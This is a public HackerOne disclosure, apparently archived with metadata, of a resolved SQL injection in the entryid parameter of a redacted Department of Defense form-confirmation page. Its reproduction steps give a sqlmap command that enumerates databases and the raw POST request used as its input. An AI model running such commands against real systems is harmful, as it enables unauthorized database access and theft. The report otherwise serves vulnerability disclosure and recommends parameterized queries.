---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - stack/php
  - vuln/sql-injection
  - fix/parameterized-query
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2026-01-12
submitted: 2025-05-05T15:42:36.876Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "jonasdiasrebelo"
source: "https://hackerone.com/reports/3127198"
title: "SQL Injection - entryid parameter in 'formbuilderv2-confirmation.php'"
---
# SQL Injection - entryid parameter in 'formbuilderv2-confirmation.php'

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 6 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2026-01-12

- Report: [https://hackerone.com/reports/3127198](https://hackerone.com/reports/3127198)
- CWE: SQL Injection
- Submitted: 2025-05-05T15:42:36.876Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Description:**
Hi!
I discovered a SQL Injection vulnerability via entryid on the website █████. The vulnerability allows for the manipulation of SQL queries executed by the backend database, which could potentially lead to unauthorized data access or manipulation.

## References

█████████

## Impact

The ability to manipulate SQL queries can lead to:
Unauthorized access to sensitive data.
Potential data leakage.
Data manipulation or corruption.
Full database compromise if administrative permissions are accessible.

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Use the sqlmap:

sqlmap -r file3.txt --dbs --tamper=between -p 'entryid' --dbms=mysql --batch


Use the file3.txt:

```
POST /actions/formbuilderv2-confirmation.php HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https███
Cookie: █████████
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 112
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Host: █████████
Connection: Keep-alive

entryid=1&formid=1&redirect=/form/apply-online/thank-you&useremail=
```

## Suggested Mitigation/Remediation Actions
Use parameterized queries when dealing with SQL queries that contain user input. Parameterized queries allow the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.

## Timeline

- **Report Filed**
- **2025-05-05** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
